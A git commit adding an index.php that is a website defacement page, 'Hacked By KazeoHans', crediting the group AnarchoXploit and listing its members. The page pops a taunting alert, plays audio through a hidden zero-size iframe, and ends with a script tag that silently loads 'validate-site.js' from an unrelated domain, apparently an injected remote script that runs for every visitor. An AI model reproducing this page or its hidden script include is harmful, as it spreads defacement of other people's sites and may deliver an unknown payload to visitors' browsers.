2d819924d73a6b57f9b464e761e5c514a857a618
haniffikri008 <43465633+haniffikri008@users.noreply.github.com>
2018-10-05 19:40:47 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,59 @@
+
+
+<html xmlns='http://www.w3.org/1999/xhtml'><head>
+<meta charset='utf-8'>
+<title>Hacked By KazeoHans</title>
+<script>alert('You Lose Zuahahaha !!!')</script>
+<meta name='description' content='AnarchoXploit'>
+<meta name='author' content='AR404'>
+<link rel='icon' type='image/png' href='"https://image.ibb.co/nGq1wp/download.png"'>
+<style type='text/css'>
+body {background:black; color:#FFFFFF; text-decoration:none; font-family:Concert One; font-size:16px;}
+img {opacity:1.0;}
+img:hover {opacity:1;}
+a {text-decoration:none; color:#FFFFFF;}
+a:hover {text-decoration:none; color:#666666;}
+</style><link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'><meta name='chromesniffer' id='chromesniffer_meta' content='{&quot;GoogleFontApi&quot;:-1}'><script type='text/javascript' src='chrome-extension://homgcnaoacgigpkkljjjekpignblkeae/detector.js'></script></head>
+
+
+
+<body> 
+<center><img src='https://image.ibb.co/cdP7Ye/Anarcho_Xploit_20181004_115937.jpg'><br><br>
+<font face='Iceland' size='9' color='white'>Hacked By KazeoHans</font><font face='Iceland' size='9' color='#008000'></font><font face='Iceland' size='9' color='#008080'></font><p><br><br>
+<font face='Iceland' size='6' color='white'> 
+</font></p><p><font face='Iceland' size='6' color='white'><span style='background-color: #000000'>
+<font><a href='' >!!! When The Black Starts To Fade, The White Starts To Be Contaminated !!!  </a> </font>
+<br>
+
+<iframe width='0' height='0' scrolling='no' frameborder='no' allow='autoplay' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/395897880&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true'></iframe>
+
+<br>
+<font color='red' face='Iceland' size='6'>
+Official Member AnarchoXploit<br>
+<marquee style='border:white 2px SOLID'></center><font color='lightblue' face='Iceland' size='5'> •Unholy
+•NoiseCrusT
+•XZ-SEC
+•Unational
+•HellMe
+•CHILDROP_23
+•RyuWare404
+•KazeoHans
+•TronGanss
+•X-2RU
+•Sbastiy@n Style
+• Unheard
+• AR404
+• X-Sweet
+• xServer404
+• R4N-SEC
+• Invec7or 
+• xMither0z
+• Vyraze
+•ANARCHIST X")
+• ZeeFourtwnty
+• Countrix. || Koala || || Sen}{umPalsu || || Mr-NgeFly</marquee></font><br><br>
+<font color='white' face='Iceland' size='5'>Copyright &copy; 2018 AnarchoXploit
+
+
+ 
+</marquee></b></font><script type='text/javascript' src='http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=52131x6966x&amp;r=48'></script></body></html>
